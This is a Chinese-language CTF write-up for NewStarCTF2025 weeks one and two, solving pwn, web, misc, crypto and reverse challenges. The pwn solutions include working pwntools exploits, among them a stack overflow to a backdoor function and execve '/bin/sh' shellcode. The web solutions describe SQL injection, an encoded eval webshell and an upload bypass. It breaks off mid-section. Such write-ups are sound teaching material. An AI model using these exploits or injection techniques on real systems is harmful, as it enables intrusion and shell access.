---
date: '2026-01-26T22:33:40+08:00'
draft: false
title: 'NewStarCTF2025 WP'
summary: 'NewStarCTF2025第一周的WP' 
---
# Week1

## Pwn

### GNU Debugger

将下载的附件用gdb打开

![image-20250930142638665](imgs/image-20250930142638665.png)

按照引导继续操作

![image-20250930142744261](imgs/image-20250930142744261.png)

第一关

![image-20250930143000631](imgs/image-20250930143000631.png)

第二关

![image-20250930143339823](imgs/image-20250930143339823.png)

第三关

![image-20250930143752740](imgs/image-20250930143752740.png)

第四关

![image-20250930143914533](imgs/image-20250930143914533.png)

拿到flag  flag{17ea4a95-62c3-4bef-9469-c6910d8b3aa1}



### INTbug

IDA打开分析代码，发现每次用户输入>0 `v1`自增，但是自增需要小于0，v1是int16类型的变量，其取值范围是从 -32768 到 32767。当 `v1` 增加到超过 32767 时，会发生溢出，数值会回绕到 -32768

![image-20250929132930656](imgs/image-20250929132930656.png)

为了使 `v1` 发生溢出，我们需要计算从0增加到32767所需的次数，然后再加上1次，使其回绕到 -32768

那么可以写exp

```python
from pwn import *

context.log_level = 'debug'
p = remote('47.94.87.199', 20493)

print("Initial output:", p.recvrepeat(timeout=2).decode())

p.send(b'1\n')
print("Response after one input:", p.recvrepeat(timeout=2).decode())


chunk_size = 500
total_inputs = 32768
for i in range(0, total_inputs, chunk_size):
    chunk = b'1\n' * min(chunk_size, total_inputs - i)
    p.send(chunk)
    p.clean(timeout=0.1)

try:
    p.recvuntil(b'You got it!\n', timeout=10)
    flag = p.recvline().decode().strip()
    print("Flag:", flag)
except EOFError:
    print("Connection closed unexpectedly.")
except TimeoutError:
    print("Timeout waiting for 'You got it!'.")

p.close()
```

![image-20250929140928578](imgs/image-20250929140928578.png)

拿到flag

### pwn's door

使用IDA打开分析代码![image-20250929122755761](imgs/image-20250929122755761.png)

分析逻辑，发现需要输入passwd 703829

nc 连接输入密码后得到sh，可以执行命令

cat flag 得到flag

![image-20250929122811506](imgs/image-20250929122811506.png)

### overflow

pwn的常规流程

![image-20251001173108463](imgs/image-20251001173108463.png)

用IDA分析程序

![image-20251001172424385](imgs/image-20251001172424385.png)

先看show函数

![image-20251001172642938](imgs/image-20251001172642938.png)

发现有提示，告诉我们ret2text，接下来看try函数

![image-20251001172758494](imgs/image-20251001172758494.png)

发现存在栈溢出，gets是一个危险函数，对读入的数据没有大小限制，接下来我们来找一下后门函数

![image-20251001172909096](imgs/image-20251001172909096.png)

gdb调试确定偏移

![image-20251001173601559](imgs/image-20251001173601559.png)

接下来，可以写exp，一边写一边调试

```py
from pwn import *
io = process("./overflow")
elf = ELF("./overflow")
offset = 264
backdoor_addr = elf.symbols['backd00r']
payload = offset * b'a' + p64(backdoor_addr+1)
io.readuntil(b'Enter your input:')
io.sendline(payload)
io.interactive()
```

这里打本地时发现直接用backdoor的地址会报错，这里往下找一条，原因是调试64位程序时，ubuntu18以上系统调用system函数时是需要栈对齐的。再具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐。

![image-20251001174813525](imgs/image-20251001174813525.png)

接下来打远程拿flag

![image-20251001174952500](imgs/image-20251001174952500.png)

flag{e6437c28-4be9-424e-aebb-47000f703a03}



### input_function

pwn的常规流程，先看看保护

![image-20251001175719393](imgs/image-20251001175719393.png)

分析代码，可以看见read是溢出点，mmap使得这段内存可读可写可执行，能分析出考察ret2shellcode

![image-20251001175354965](imgs/image-20251001175354965.png)

gdb调试vmmap找有rwx权限的地址

![image-20251001175959122](imgs/image-20251001175959122.png)

直接写脚本，打本地

```py
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./input_function')

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
payload = shellcode.ljust(0x500, b'A')
p.sendline(payload)
p.interactive()
```

![image-20251001181920224](imgs/image-20251001181920224.png)

接下来打远程

![image-20251001182135815](imgs/image-20251001182135815.png)

flag{c7ecd813-fb82-431c-8266-2c8ae2d08609}

## Web

### multi-headach3

根据题目提示，猜测爬虫协议

![image-20250930144854550](imgs/image-20250930144854550.png)

有一个hidden.php 不允许访问，那不让看我偏看

![image-20250930144920056](imgs/image-20250930144920056.png)

访问后，看网络请求，发现页面被重定向，flag写在响应头

![image-20250930145030371](imgs/image-20250930145030371.png)

### strange_login

打开页面看见登录框，结合提示：我当然知道1=1了！

![image-20250930145159525](imgs/image-20250930145159525.png)

合理怀疑是SQL注入，直接万能密码

![image-20250930145336769](imgs/image-20250930145336769.png)

登录进去，获得flag

![image-20250930145410178](imgs/image-20250930145410178.png)



### 黑客小W的故事（1）

抓包修改count ,得到下一关的路由![image-20250929144924789](imgs/image-20250929144924789.png)

![image-20250929145029287](imgs/image-20250929145029287.png)

![image-20250929145050971](imgs/image-20250929145050971.png)

![image-20250929145116825](imgs/image-20250929145116825.png)

根据提示

![image-20250929145212777](imgs/image-20250929145212777.png)

抓包改包

![image-20250929211047391](imgs/image-20250929211047391.png)

改成delete方法

![image-20250929210942877](imgs/image-20250929210942877.png)

![image-20250929211243252](imgs/image-20250929211243252.png)

继续

![image-20250929211417301](imgs/image-20250929211417301.png)

改UA头再发包

![image-20250930104437590](imgs/image-20250930104437590.png)

试试将正常的ua头部分替换

CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) DashSlash/140.0.0.0 Safari/537.36

![image-20250930110659491](imgs/image-20250930110659491.png)

拿到flag

![image-20250930110724906](imgs/image-20250930110724906.png)

flag{d9689014-bc9e-4712-9779-89adccbd79fc}

### 宇宙的中心是php

打开页面后发现没有办法使用快捷键看源码，使用view-source:协议

![image-20250930145711013](imgs/image-20250930145711013.png)

访问s3kret.php，十六进制绕过得到flag

![image-20250930145919566](imgs/image-20250930145919566.png)



### 我真得控制你了

打开题目，用view-source看源码，然后f12打开开发者工具

![image-20250930153340763](imgs/image-20250930153340763.png)

删除后，按住esc，点击启动

![image-20250930153718919](imgs/image-20250930153718919.png)

来到这个页面

![image-20250930153806434](imgs/image-20250930153806434.png)

提示弱口令，猜一猜就出来了，或者爆破也可以 用户名是admin密码是111111

![image-20250930153921139](imgs/image-20250930153921139.png)

分析代码，逻辑为需要输入一个表达式最后表达式的值为2025，传\~(\~2025)，绕过限制拿到flag

![image-20250930154041181](imgs/image-20250930154041181.png)



### 别笑，你也过不了第二关

发现是小游戏，ctrl+u 查看源码

![image-20250930154520618](imgs/image-20250930154520618.png)

发现关键代码

![image-20250930154918445](imgs/image-20250930154918445.png)

手动访问![image-20250930155010048](imgs/image-20250930155010048.png)

根据关键性代码抓包改包，得到flag

![image-20250930155113924](imgs/image-20250930155113924.png)



## Misc

### Sign in

签到题，没什么好说的

![image-20250929141357718](imgs/image-20250929141357718.png)

### MISC城邦-压缩术

拿到附件解压，发现需要密码，读题发现提示：欢迎挑战者们来到压缩术的考验关卡，本关考察压缩术的综合使用，请挑战者们通过6位密码门开始挑战吧！(要想使用压缩术，请先念咒语"abcd...xyz0123...789")，猜测压缩包**密码可能是6位密码，小写字母数字组合**

使用工具爆破密码，规则小写字母+数字+长度6

![image-20250929141649962](imgs/image-20250929141649962.png)

![image-20250929141831832](imgs/image-20250929141831832.png)

爆破出密码ns2025解压后得到

![image-20250929141917568](imgs/image-20250929141917568.png)

看提示文件

```txt
恭喜你，通过了第一道考验，请用其他压缩魔法打开下一扇门吧！（下一扇门明明没有密码，为什么还是要输入密码呢？）
```

可能压缩包是伪加密，修复后解压得到

![image-20250929142050278](imgs/image-20250929142050278.png)

发现flag.zip里也有key.txt，而且和外面得到key.txt大小一致，怀疑key.txt就是这个压缩里的文件，将key.txt用和flag.zip同样的压缩软件压缩后，使用明文攻击，这里猜测使用winrar压缩

![image-20250929142515725](imgs/image-20250929142515725.png)

拿到密码解压后拿到flag

![image-20250929142600939](imgs/image-20250929142600939.png)

### EZ_fence

拿到一张图片，图片有一些奇怪的字符，像base64但是base64的等于在末尾，再根据题目名称fence 是栅栏的意思，猜测需要先解栅栏把等于号移动到最后再base64。先jpg图片binwalk分离压缩包

![image-20250930023213242](imgs/image-20250930023213242.png)

拿到一个压缩包，里面应该就是flag，但需要密码，不知道密码先放一边

jpg图片修复高度后得到

![image-20250930020303570](imgs/image-20250930020303570.png)

发现下面字符刚好64个可能是换表base64，可以试试上面的栏栅后解base64

base64表

```
8426513709qazwsxedcrfvtgbyhnujmikoplQWSAERFDTYHGUIKJOPLMNBVCXZ-_
```

将 rdh9zfwzSgoVA7GWtLPQJK=vwuZvjhvPyyvjnMWoSotB

解栏栅密码W型栏栅分4栏得rSvMwgdouWZVhAvoj79GhSvWztPoyLfPytvQwJjBnKz=

![image-20250930023021199](imgs/image-20250930023021199.png)

再换表base64解码得到 New5tar_zjuatrojee1mage5eed77yo#

![image-20250930022626293](imgs/image-20250930022626293.png)

应该是图片分离出来的压缩包的密码，解压看见flag.doc文件内容就是flag

flag{y0u_kn0w_ez_fence_tuzh0ng}

### OSINT-天空belong

先读题

flag格式：flag{航班号_当前已经经过的省会城市名称(**市)_所拍摄设备制造商}

![image-20250929160659700](imgs/image-20250929160659700.png)

发现一些关键信息，拍摄日期是2025/8/17 15:03，设备制造商是Xiaomi，看图可以发现飞机注册号为B-7198

经查询B-7198 是一架属于乌鲁木齐航空（Urumqi Air）的波音 737-800 飞机

它经常执飞的航线包括乌鲁木齐地窝堡国际机场往返新加坡樟宜机场（经停武汉天河国际机场）的 UQ2661 和 UQ2662 航班，以及乌鲁木齐地窝堡国际机场往返合肥新桥国际机场、兰州中川国际机场的 UQ2521 和 UQ2522 航班，接下来去查那个时间段的航班信息

![image-20250929161709210](imgs/image-20250929161709210.png)

符合拍摄时间的应该就只有这一航班

![image-20250929163208749](imgs/image-20250929163208749.png)

flag{UQ3574\_武汉\_Xiaomi}



### 我不要革命失败

下载附件后拿到一个txt和dmp文件，txt内容flag{崩溃类型(即蓝屏显示的终止代码)_故障进程}

使用windbg打开

![image-20250929224307859](imgs/image-20250929224307859.png)

!process ffffd18e9cfbc140 0来获取具体的进程名称![image-20250929224236076](imgs/image-20250929224236076.png)

flag{CRITICAL_PROCESS_DIED_svchost.exe}





### 前有文字，所以搜索很有用

拿到题目，解压发现有三个文件夹分别看看

![image-20250929230742555](imgs/image-20250929230742555.png)

看track1，根据文件名称提示猜测零宽字符隐写

![image-20250929231353165](imgs/image-20250929231353165.png)

把隐藏的内容解base64

![image-20250929231316752](imgs/image-20250929231316752.png)

拿到flag的第一部分flag{you_

track2先看txt文件，很明显的brainfuck特征

![image-20250929231621404](imgs/image-20250929231621404.png)

解密得到brainfuckisgooooood，接下来看咏雪.docx，将所有内容复制到记事本

![image-20250930013211900](imgs/image-20250930013211900.png)

猜测可能为snow隐写，用工具解

![image-20250930013230197](imgs/image-20250930013230197.png)

![image-20250930013057705](imgs/image-20250930013057705.png)

解莫斯密码得到 flag的中间部分0V3RC4ME_

track3里有个txt，名称是谁多谁少，一算便知.txt，打开后发现很多奇怪的字符，根据文件名猜测是字频统计

![image-20250929230950738](imgs/image-20250929230950738.png)

这里很像flag的最后一段，记录下来cH@1LenG3s}

最后得到flag{you_0V3RC4ME_cH@1LenG3s}

## Crypto

### Sagemath使用指哪？

![image-20250929165127613](imgs/image-20250929165127613.png)

执行脚本获得flag

### 初识RSA

读题，需要解key值5ae9b7f211e23aac3df5f2b8f3b8eada

直接somd5网站在线解密https://www.somd5.com/

![image-20250929171150323](imgs/image-20250929171150323.png)

写解密脚本

```py
from Crypto.Util.number import *
import hashlib
import math

# 已知数据
P_ = 8950704257708450266553505566662195919814660677796969745141332884563215887576312397012443714881729945084204600427983533462340628158820681332200645787691506
n = 44446616188218819786207128669544260200786245231084315865332960254466674511396013452706960167237712984131574242297631824608996400521594802041774252109118569706894250996931000927100268277762882754652796291883967540656284636140320080424646971672065901724016868601110447608443973020392152580956168514740954659431174557221037876268055284535861917524270777789465109449562493757855709667594266126482042307573551713967456278514060120085808631486752297737122542989222157016105822237703651230721732928806660755347805734140734412060262304703945060273095463889784812104712104670060859740991896998661852639384506489736605859678660859641869193937584995837021541846286340552602342167842171089327681673432201518271389316638905030292484631032669474635442148203414558029464840768382970333
c = 42481263623445394280231262620086584153533063717448365833463226221868120488285951050193025217363839722803025158955005926008972866584222969940058732766011030882489151801438753030989861560817833544742490630377584951708209970467576914455924941590147893518967800282895563353672016111485919944929116082425633214088603366618022110688943219824625736102047862782981661923567377952054731667935736545461204871636455479900964960932386422126739648242748169170002728992333044486415920542098358305720024908051943748019208098026882781236570466259348897847759538822450491169806820787193008018522291685488876743242619977085369161240842263956004215038707275256809199564441801377497312252051117441861760886176100719291068180295195677144938101948329274751595514805340601788344134469750781845

# 已知 key
key = b'crypto'

# 验证 MD5
KEY = hashlib.md5(key).hexdigest()
print(f"KEY = {KEY}")
assert KEY == '5ae9b7f211e23aac3df5f2b8f3b8eada'

# 恢复 p
key_long = bytes_to_long(key)
p = P_ ^ key_long
print(f"p = {p}")

# 验证 p 是素数且满足 n = p^3 * q^2
print(f"p is prime: {isPrime(p)}")
print(f"n % p^3 == 0: {n % (p**3) == 0}")

# 计算 q
q2 = n // (p**3)
q = math.isqrt(q2)  # 使用 math.isqrt
if q * q == q2 and isPrime(q):
    print(f"q = {q}")
else:
    # 尝试附近值
    for q_candidate in range(q-2, q+3):
        if n % (p**3 * q_candidate**2) == 0 and isPrime(q_candidate):
            q = q_candidate
            print(f"q = {q}")
            break

# 计算 phi(n) = p^2 * (p-1) * q * (q-1)
phi = (p**2) * (p-1) * q * (q-1)

# 解密
e = 65537
d = inverse(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(f"Flag: {flag.decode()}")
```

拿到flag![image-20250929171127388](imgs/image-20250929171127388.png)

### 唯一表示

根据给定的余数列表和对应的素数，使用 CRT 重建原始整数 *n*。然后将这个整数转换回字节表示，最终解码为字符串。

```py
from sympy.ntheory.modular import crt
from Crypto.Util.number import long_to_bytes

# 给定的余数列表
remainders = [
    1, 2, 2, 4, 0, 2, 11, 11, 8, 23, 1, 30, 35, 0, 18, 30, 55, 60, 29, 42, 8, 13, 49, 11, 69, 26, 8, 73, 84, 67, 100, 9, 77, 72, 127, 49, 57, 74, 70, 129, 146, 45, 35, 180, 196, 101, 100, 146, 100, 194, 2, 161, 35, 155
]
# 生成素数列表
from sympy import primerange
primes = list(primerange(2, 114514))

# 使用 CRT 重建原始整数
reconstructed, _ = crt(primes[:len(remainders)], remainders)

message_bytes = long_to_bytes(reconstructed)
flag = message_bytes.decode()
print(flag)
```

拿到flag{9c8589c2-aecb-4ec4-b027-654bc322e2d1}



### 小跳蛙

分析代码知

当 *a*>*b* 时，青蛙跳到 (*a*−*b*,*b*)。当 *a*<*b* 时，青蛙跳到 (*a*,*b*−*a*)。当 *a*=*b* 时，青蛙停留在原地。使用正则表达式 `r'[()]?(\d+)[,\s]+(\d+)[)]?'` 解析用户输入的格式，确保输入是两个整数，用逗号或空格分隔。使用 `while` 循环处理五轮挑战。如果用户输入错误，提示正确答案并退出循环。编写脚本完成

nc 连接后观察一下回复的内容

![image-20251001192249821](imgs/image-20251001192249821.png)

```py
from pwn import *
context.log_level = 'debug'

def frog_jump(a, b):
    """
    模拟青蛙的跳跃过程，直到 a == b。
    """
    while a != b:
        if a > b:
            a -= b
        else:
            b -= a
    return a, b

def solve_frog_puzzle(a, b):
    """
    给定初始位置 (a, b)，计算青蛙的最终位置 (x, y)。
    """
    x, y = frog_jump(a, b)
    return x, y

p = remote("8.147.132.32", 17596)
p.recvuntil(b'If you succeed, I will give you a mysterious flag.')
p.recvline()
p.recvline()
str1 = p.recvline().strip().decode()

# 使用正则表达式提取 a 和 b 的值
import re
pattern = r'\((\d+),(\d+)\)'
match = re.search(pattern, str1)
if match:
    a, b = map(int, match.groups())
else:
    print("Failed to parse the initial (a, b) values.")
    p.close()
    exit()

# 计算最终位置
x, y = solve_frog_puzzle(a, b)

# 发送答案
p.sendline(f'{x},{y}'.encode())

for i in range(0, 4):
    p.recvuntil(b"flag!")
    p.recvline()
    c = p.recvline().strip().decode()
    match = re.search(pattern, c)
    if match:
        n1, n2 = map(int, match.groups())
    else:
        print("Failed to parse the (a, b) values.")
        p.close()
        exit()
    x, y = solve_frog_puzzle(n1, n2)
    p.sendline(f'{x},{y}'.encode())
p.interactive()
```

![image-20251001200624579](imgs/image-20251001200624579.png)

### 随机数之旅1

message_int 是未知的，但可以通过给定的 hint 值反向计算出来

解密脚本

```py
def recover_message_int(a, p, hint_values):
    """
    从 hint 序列中恢复 message_int。
    """
    # 取最后一个 hint 值
    hint_i = hint_values[-1]
    hint_i_minus_1 = hint_values[-2]

    # 反向计算 message_int
    message_int = (hint_i - a * hint_i_minus_1) % p
    return message_int


# 已知的 a 和 p
a = 295789025762601408173828135835543120874436321839537374211067344874253837225114998888279895650663245853
p = 516429062949786265253932153679325182722096129240841519231893318711291039781759818315309383807387756431

# 已知的 hint 序列
hint_values = [
    184903644789477348923205958932800932778350668414212847594553173870661019334816268921010695722276438808,
    289189387531555679675902459817169546843094450548753333994152067745494929208355954578346190342131249104,
    511308006207171169525638257022520734897714346965062712839542056097960669854911764257355038593653419751,
    166071289874864336172698289575695453201748407996626084705840173384834203981438122602851131719180238215,
    147110858646297801442262599376129381380715215676113653296571296956264538908861108990498641428275853815,
    414834276462759739846090124494902935141631458647045274550722758670850152829207904420646985446140292244
]

# 恢复 message_int
message_int = recover_message_int(a, p, hint_values)

# 将 message_int 转换为字节表示
from Crypto.Util.number import long_to_bytes

flag = long_to_bytes(message_int).decode()

print("Recovered flag:", flag)
```

![image-20251001201929793](imgs/image-20251001201929793.png)



## Reverse

### Strange Base

使用IDA打开exe

![image-20250929171922653](imgs/image-20250929171922653.png)

分析，很容易看出是base64换表的问题，这里可以找到已经base64的字符串，接下来找替换的表就完事了。换表base64解码应该就可以得到flag

shift+f12找字符串

![image-20250929172224839](imgs/image-20250929172224839.png)

这个应该就是

写脚本解个码

```py
import base64
# 要解码的字符串
str1 = ""
str1 = input("请输入要解码的base64编码：")
# base64替换码表
string1 = "HElLo!A=CrQzy-B4S3|is'waITt1ng&Y0u^{/(>v<)*}GO~256789pPqWXVKJNMF"
# base64原码表
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))
```

![image-20250929172751542](imgs/image-20250929172751542.png)

### X0r

IDA打开发现加密逻辑

![image-20250929180252958](imgs/image-20250929180252958.png)

异或的逆运算还是异或根据加密写解密

```c
#include <stdio.h>
#include <string.h>

int main() {
    char str[24] = "anu`ym7wKLl$P]v3q%D]lHpi";
    int v5[3];
    int i, j;
    int v7 = strlen(str);  // 获取字符串长度
    
    // 第一轮异或操作
    for (i = 0; i < strlen(str); ++i) {
        if (i % 3) {
            if (i % 3 == 1)
                str[i] ^= 0x11u;
            else
                str[i] ^= 0x45u;
        } else {
            str[i] ^= 0x14u;  // 修复变量名大小写
        }
    }
    
    // 设置v5数组
    v5[0] = 19;
    v5[1] = 19;
    v5[2] = 81;
    
    // 第二轮异或操作
    for (j = 0; j < v7; ++j)
        str[j] ^= v5[j % 3];
    
    printf("%s\n", str);
    
    return 0;
}
```

![image-20250929180435938](imgs/image-20250929180435938.png)

获得flag

### Puzzle

flag第一部分![image-20250929195557903](imgs/image-20250929195557903.png)

![image-20250929195609309](imgs/image-20250929195609309.png)

应该就是Do_Y0u_

flag的第二部分是这个函数名Like_7his_Jig

![image-20250929194545037](imgs/image-20250929194545037.png)

这是第三部分

![image-20250929194841997](imgs/image-20250929194841997.png)

提取出数据，写脚本解密0xD7D7D8DDF2DAEDDE，提取出来的数据是小端序的需要反着输出

```py
# 将 64 位整数转换为字节数组并反转
encrypted_hex = 0xD7D7D8DDF2DAEDDE
encrypted_bytes = encrypted_hex.to_bytes(8, 'little')  # 小端序

# XOR 解密
decrypted = []
for byte in encrypted_bytes:
    decrypted.append(byte ^ 0xAD)

# 转换为字符串
flag_part = ''.join(chr(b) for b in decrypted)
print(f"解密结果: {flag_part}")
```

解密结果为s@w_puzz

flag的第4部分

![image-20250929195226772](imgs/image-20250929195226772.png)

1e_Gam3

最后flag拼接起来为flag{Do_Y0u_Like_7his_Jigs@w_puzz1e_Gam3}





### EzMyDroid

jadx打开，找到加密逻辑，发现是AES-ECB模式，提取KEY和密文

![image-20250929230009064](imgs/image-20250929230009064.png)

使用工具解密得到flag

![image-20250929225917382](imgs/image-20250929225917382.png)



### plzdebugme

先拖进Linux运行看看，发现有提示，接下来使用IDA远程调试

![image-20250930141017413](imgs/image-20250930141017413.png)

断点下在这里

![image-20250930142049230](imgs/image-20250930142049230.png)

调试

![image-20250930142133935](imgs/image-20250930142133935.png)

鼠标点进去看flag的内容

![image-20250930141930614](imgs/image-20250930141930614.png)

shift+e提取出来

![image-20250930141955627](imgs/image-20250930141955627.png)

flag{It3_D3bugG_T11me!_le3_play}

## 挑战

### [Cry]随机数之旅1.3

解密脚本

```py
from Crypto.Util.number import long_to_bytes

p = 478475545597700801137542329947268027178596565166277501475984783168264336204134464479893480035711325623
hint = [
    249919247565764496968024420668100990050724930264873012553221627994767139138419916559737152956192938786,
    341098538517870638403021803297435486563954299904421591195678329627022088404800269966659959073623486227,
    20018219100052262465673657639106096626775270934552714906385093540517665089433306304783945869390965352,
    477110987927537932362183022083084081803652185884243696031637228688890267574215943741789667631285188517,
    316109317526042308856009312339591028959770431193022541894694590723163440242617594274841279773268292931,
    288838512929949193288464156452590499193348618769922838206940876596503314942400180385295933551444987426,
    181266945000896484248052902194760405660042158622313374086868842724033187572461235292532472052806294610,
    363891817161955280083221864938995130581363107122643810787521989924285652140760869565757181912307151144,
    176158258425616548246181359314308658522975855113878838400631572536985398273419876407488652665740506588,
    226304243444318985869957901105733987782986057182483943969163921743774283862329285859875298207849486395,
    235563126973016483026307105002236457145848856279569924823679216801904771557144382780782533443602319128
]

# 计算 a
num = (hint[2] - hint[1]) % p
den = (hint[1] - hint[0]) % p
a = (num * pow(den, -1, p)) % p

# 计算 m
m = (hint[1] - a * hint[0]) % p

# 转为 flag
flag = long_to_bytes(m)
print(flag.decode())
```

![image-20251001204816465](imgs/image-20251001204816465.png)

### [Cry]随机数之旅1.9

解密脚本

```py
from math import gcd, isqrt
from Crypto.Util.number import long_to_bytes, isPrime

hint = [
    207815833858860472630525746720294722862686098236015762403351705374683468788325370179356514749526876950,
    211015979308620411696525425095777275753476560571747569104626146643460892934355111246007348590054728278,
    154982921170646039127386113914327168037474092849926050668784589159876343568545829713567339881566128774,
    14301447927625534901480862591544923748585828474154787997664067408999800058813140550333919836238991874,
    274602491551514790133598749654877237076653637818520480950523811116227833787921484758457209356323726695,
    170369781650509946447172258827489337909221053707541176039704241960102824673107536295921548339896943064,
    199159531778559581852282705906428311276685520954787407093495692307498420437271623202700142459262344361,
    152127625735448140599545820146663204043528582114006890378053333070292552669943282154992607592819602345,
    258118974363253374610905261929872690383062999526270455540048172948029807006984567635623967904079172525,
    83791161992040915418707637123797436818204732030321155500557330793843135987740494961151450687354553588,
    240283309715668400040909429066350841404133576389215959280394956765762171700654715262676050019779801415,
    38842976594694523258855648781570648918799284259234846435828069057016223394465201311284210539158742069,
    112124551443162148461799084208953311502063130294653691708825709872287471313112327095490868557801413814,
    130493216949781764571166990014451012680060230560283908734192439983915035889157778838781734918556337718,
    257057021216255933786617119107267370802049994234255480193196121654281929053027702977268758326889526999,
    50825978665892428834553479141064382082596923815786131694407281600281500668374124718717621345592142201
]

# 计算差分
d = []
for i in range(len(hint) - 1):
    d.append(hint[i + 1] - hint[i])

# 计算 T_k = d_{k+1} * d_0 - d_k * d_1
T = []
for k in range(1, len(d) - 1):
    T.append(d[k + 1] * d[0] - d[k] * d[1])

# 通过 gcd 恢复 p_candidate
p_candidate = 0
for i in range(len(T)):
    for j in range(i + 1, len(T)):
        g = gcd(T[i], T[j])
        if g > p_candidate:
            p_candidate = g

print("Recovered p_candidate =", p_candidate)
print("Bit length:", p_candidate.bit_length())


# 分解 p_candidate 找到真正的素数 p
def find_large_prime_factor(n):
    # 检查是否是素数
    if isPrime(n):
        return n

    # 试除小因子
    factors = []
    temp = n
    for p in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
        while temp % p == 0:
            factors.append(p)
            temp //= p

    # 如果剩下的数是素数，返回它
    if isPrime(temp):
        return temp

    # 否则继续分解
    f = 37
    while f * f <= temp and f < 10 ** 7:  # 限制搜索范围
        if temp % f == 0:
            factors.append(f)
            temp //= f
            if isPrime(temp):
                return temp
        else:
            f += 2

    # 返回最大的因子
    all_factors = factors + [temp]
    prime_factors = [x for x in all_factors if isPrime(x)]
    if prime_factors:
        return max(prime_factors)
    return max(all_factors)


p = find_large_prime_factor(p_candidate)
print("Extracted prime p =", p)
print("Is p prime?", isPrime(p))
print("p bit length:", p.bit_length())

# 尝试恢复 a 和 m
for i in range(len(hint) - 2):
    num = (hint[i + 2] - hint[i + 1]) % p
    den = (hint[i + 1] - hint[i]) % p

    if gcd(den, p) == 1:
        try:
            inv_den = pow(den, -1, p)
            a = (num * inv_den) % p
            print(f"Recovered a using hints[{i}:{i + 3}] =", a)

            # 恢复 m
            m = (hint[i + 1] - a * hint[i]) % p

            # 转为 flag
            flag = long_to_bytes(m)
            print("Flag:", flag.decode())
            break

        except ValueError as e:
            print(f"Error with hints[{i}:{i + 3}]:", e)
            continue
else:
    print("Failed to recover a and m with all hint pairs")
```

![image-20251001210310543](imgs/image-20251001210310543.png)





# Week2

## Web

### DD加速器

打开页面尝试命令执行，去读flag，发现flag不在/flag里尝试读环境变量

![image-20251006120306640](imgs/image-20251006120306640.png)

![image-20251006120358044](imgs/image-20251006120358044.png)



### 真的是签到诶

打开页面后发现代码，分析一下

![image-20251006120648789](imgs/image-20251006120648789.png)

首先这个函数实现了Atbash密码 简单的替换密码 A-Z，逆运算再加密一遍

if ($cipher) {
 $cipher = base64_decode($cipher);
 $encoded = atbash($cipher);
 $encoded = str_replace(' ', '', $encoded);
 $encoded = str_rot13($encoded);
 @eval($encoded);
 exit;
}再分析这里将参数先base64解码，然后atbash加密，然后去空格，rot13一下最后交给eval去执行

比如这里我想执行phpinfo(); 应该先rot13 -> atbash加密 -> base64编码 ，应该是这样的值：

eGZ4ZXpoeSgpOw==

![image-20251006122044402](imgs/image-20251006122044402.png)

一个eval($_GET['c']); 传参给c去绕过限制

![image-20251006122152939](imgs/image-20251006122152939.png)

![image-20251006122248271](imgs/image-20251006122248271.png)

发现这样是可以的，接下来直接命令执行找flag即可

![image-20251006122333034](imgs/image-20251006122333034.png)

### 搞点哦润吉吃吃橘

f12发现提示

![image-20251006122645760](imgs/image-20251006122645760.png)

成功登录后来到这个页面

![image-20251006122745703](imgs/image-20251006122745703.png)

抓包开始验证发现提示：doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......

表达式直接写在返回包里了，这里每次的 Cookie 不一样，测试之后发现用 session 也能获取返回包。Python 写脚本获取flag

```python
# # Doro/Doro_nJlPVs_@123
import requests
from fake_useragent import UserAgent
import json

user_agent = UserAgent().google

def expr():
    url = 'https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/login'
    session = requests.session()
    header = {
        'User-Agent': user_agent
    }
    args = {
        'username': 'Doro',
        'password': 'Doro_nJlPVs_@123'
    }
    r = session.post(url, headers=header, data=args)
    return session


def start_challenge(session):
    url = 'https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/start_challenge'
    header = {
        'Content-Type': 'application/json',
        'User-Agent': user_agent
    }

    r = session.post(url, headers=header)
    j = json.loads(r.text)
    s = str(j['expression'])
    eva = s.strip().lstrip('token = ')
    result = eval(eva)
    return result


def verify_token(session, result):
    url = 'https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/verify_token'
    header = {
        'Content-Type': 'application/json',
        'User-Agent': user_agent
    }
    args = {
        'token': result
    }
    r = session.post(url, headers=header, json=args)
    print(r.text)


session = expr()
res = start_challenge(session)
verify_token(session, res)
```

![image-20251012143929588](imgs/image-20251012143929588.png)



### 白帽小K的故事（1）

![image-20251006132109673](imgs/image-20251006132109673.png)

走进去发现文件上传点，上传php试试，明显的前端校验，BP抓包改

![image-20251006132402274](imgs/image-20251006132402274.png)

![image-20251006132638862](imgs/image-20251006132638862.png)

上传成功

![image-20251006134640667](imgs/image-20251006134640667.png)

测试一下

![image-20251006134732273](imgs/image-20251006134732273.png)

怀疑存在文件包含漏洞

![](imgs/image-20251006134621536.png)

去找flag

![image-20251006134854474](imgs/image-20251006134854474.png)

### 小E的管理系统

发现sql注入，注入点id，发现有防火墙，进行fuzz测试，看看那些被过滤了，那些没有过滤，这个status code为500都是没有被过滤的

![image-20251006185040849](imgs/image-20251006185040849.png)

接下来测试注入是字符型还是数字型

![image-20251012144443487](imgs/image-20251012144443487.png)

测试id =1 , 2 , 2-1

![image-20251012144511881](imgs/image-20251012144511881.png)

![image-20251012144522604](imgs/image-20251012144522604.png)

很明显2-1生效了说明是数字型注入，空格被过滤可以试试%0a,%09等等尝试能否绕过

测试字段列数

![image-20251012145042268](imgs/image-20251012145042268.png)

![image-20251012145106853](imgs/image-20251012145106853.png)

经过测试，发现有5列，接下来尝试union注入，发现逗号被过滤，使用下面方法2绕过

![image-20251012150219469](imgs/image-20251012150219469.png)

![image-20251012150748097](imgs/image-20251012150748097.png)

查询 SQLite 数据库中所有的表名

![image-20251012151204803](imgs/image-20251012151204803.png)

获取表结构，这里从 sqlite_master 表中读取 sql 字段

![image-20251012150913135](imgs/image-20251012150913135.png)

```txt
